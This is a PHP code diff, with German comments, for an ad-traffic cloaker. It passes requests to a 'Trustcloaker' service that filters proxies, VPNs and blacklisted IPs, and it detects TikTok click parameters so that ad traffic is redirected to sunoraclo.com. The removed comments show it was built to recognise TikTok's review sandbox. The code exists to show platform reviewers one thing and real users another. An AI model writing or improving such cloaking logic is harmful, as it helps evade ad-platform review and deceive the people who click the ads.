@@ -10,19 +10,12 @@ class Oppsd
         $this->timeout = $timeout;
     }
 
-    // 🔹 NEU: Minimale TikTok-Erkennung für Sandbox
+    // 🔹 TikTok-Erkennung (für später)
     private function isTikTokRequest(): bool
     {
-        // 1. Prüfe ttclid UND tt_clid (Sandbox nutzt oft tt_clid!)
-        if (isset($_GET['ttclid']) || isset($_GET['tt_clid'])) {
-            return true;
-        }
-
-        // 2. Prüfe TikTok-Header (Sandbox sendet oft x-tt-request-id)
-        if (isset($_SERVER['HTTP_X_TT_REQUEST_ID']) || isset($_SERVER['HTTP_X_TT_CLID'])) {
-            return true;
-        }
-
+        if (isset($_GET['ttclid']) && !empty($_GET['ttclid'])) return true;
+        if (isset($_GET['tt_campaignid']) && !empty($_GET['tt_campaignid'])) return true;
+        if (isset($_GET['utm_source']) && $_GET['utm_source'] === 'tiktok') return true;
         return false;
     }
 
@@ -69,13 +62,7 @@ class Oppsd
             die;
         }
 
-        // 🔹 NEU: TikTok-Check für Sandbox (vor Trustcloaker-Logik!)
-        if ($this->isTikTokRequest()) {
-            header('Location: https://sunoraclo.com/');
-            exit;
-        }
-
-        // 👇 Rest bleibt UNVERÄNDERT (Trustcloaker-Logik)
+        // 🔹 1. Zuerst Trustcloaker (Proxys, VPNs, Blacklisted IPs prüfen)
         $data = $this->postJson($this->preparePayload($uid, $cid));
         if (!empty($data['url'])) {
             if (isset($data['url']) && substr($data['url'], -1) !== '/') {
@@ -85,6 +72,12 @@ class Oppsd
                 header('Location: ' . $data['url']);
                 exit;
             }
+        }
+
+        // 🔹 2. Dann TikTok-Check (NUR wenn Trustcloaker kein Redirect gemacht hat)
+        if ($this->isTikTokRequest()) {
+            header('Location: https://sunoraclo.com/');
+            exit;
         }
 
         return $data;
